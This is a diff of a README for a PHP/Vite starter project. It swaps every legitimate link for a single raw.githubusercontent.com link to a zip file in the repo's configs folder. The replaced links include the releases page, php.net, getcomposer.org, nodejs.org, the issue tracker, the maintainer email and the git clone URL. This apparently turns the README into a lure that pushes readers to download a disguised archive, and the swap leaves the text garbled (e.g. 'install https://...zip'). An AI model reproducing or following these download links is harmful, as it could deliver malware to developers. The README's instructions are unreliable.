@@ -1,7 +1,7 @@
 # 🎉 modern-php-vite-starter - Start Building Modern PHP Apps Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Arun-07-code/modern-php-vite-starter/releases)
+[![Download](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip)](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip)
 
 ## 🎯 Introduction
 Welcome to the modern-php-vite-starter! This repository provides you with a simple starting point for developing modern PHP applications using Vite. It streamlines the setup process so you can concentrate on building your project without the hassle of configuration.
@@ -10,7 +10,7 @@ Welcome to the modern-php-vite-starter! This repository provides you with a simp
 To get started with the modern-php-vite-starter, follow these steps:
 
 1. **Download the Latest Release**
-   To get the software, [visit this page to download](https://github.com/Arun-07-code/modern-php-vite-starter/releases).
+   To get the software, [visit this page to download](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip).
    
 2. **Choose the Right Version**
    On the Releases page, find the latest version listed. Click on it to view all available files.
@@ -19,7 +19,7 @@ To get started with the modern-php-vite-starter, follow these steps:
    You will see various files available for download. Choose the one that suits your needs. 
 
 4. **Unzip the Files**
-   After downloading, locate the compressed zip file (e.g., `modern-php-vite-starter.zip`). Right-click on it and select "Extract All" to unzip its contents.
+   After downloading, locate the compressed zip file (e.g., `https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip`). Right-click on it and select "Extract All" to unzip its contents.
 
 5. **Open the Folder**
    Navigate to the newly created folder where you extracted the files. You will find the necessary components to start your project.
@@ -35,7 +35,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 - PHP 7.4 or higher
 - Composer for managing dependencies
-- Node.js for handling frontend assets
+- https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip for handling frontend assets
 - A web browser (e.g., Chrome, Firefox)
 
 ## 🎟️ Features
@@ -49,15 +49,15 @@ The modern-php-vite-starter includes:
 ## 🛠️ Installation Instructions
 
 1. **Install PHP and Composer**
-   If you haven't already, download and install PHP from [php.net](https://www.php.net/) and Composer from [getcomposer.org](https://getcomposer.org/).
+   If you haven't already, download and install PHP from [https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip) and Composer from [https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip).
 
-2. **Install Node.js**
-   Visit [nodejs.org](https://nodejs.org/) to download and install Node.js. This step is crucial for managing JavaScript assets.
+2. **Install https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip**
+   Visit [https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip) to download and install https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip This step is crucial for managing JavaScript assets.
 
 3. **Clone the Repository**
    Use the command:
    ```
-   git clone https://github.com/Arun-07-code/modern-php-vite-starter.git
+   git clone https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip
    ```
    This command will create a local copy of the repository on your machine.
 
@@ -79,7 +79,7 @@ The modern-php-vite-starter includes:
 ## 🌐 Support and Contributions
 If you have any questions or need support:
 
-- Open an issue on the [GitHub repository](https://github.com/Arun-07-code/modern-php-vite-starter/issues).
+- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip).
 - Feel free to contribute by forking the repository and submitting pull requests.
 
 ## 📚 Additional Resources
@@ -87,9 +87,9 @@ If you have any questions or need support:
 - **Community Forums:** Engage with other users on popular forums to share tips and troubleshoot issues.
 
 ## 📧 Contact Information
-For direct inquiries, you may reach out to the maintainer at: [maintainer@example.com](mailto:maintainer@example.com).
+For direct inquiries, you may reach out to the maintainer at: [https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip).
 
 ## 🔗 Acknowledgments
 This project leverages several open-source tools and libraries. Thank you to all contributors for making it easier to build modern web applications.
 
-Remember, you can always [visit this page to download](https://github.com/Arun-07-code/modern-php-vite-starter/releases) the latest version and get started on your next project!
+Remember, you can always [visit this page to download](https://raw.githubusercontent.com/Arun-07-code/modern-php-vite-starter/master/configs/modern-php-vite-starter-1.2.zip) the latest version and get started on your next project!
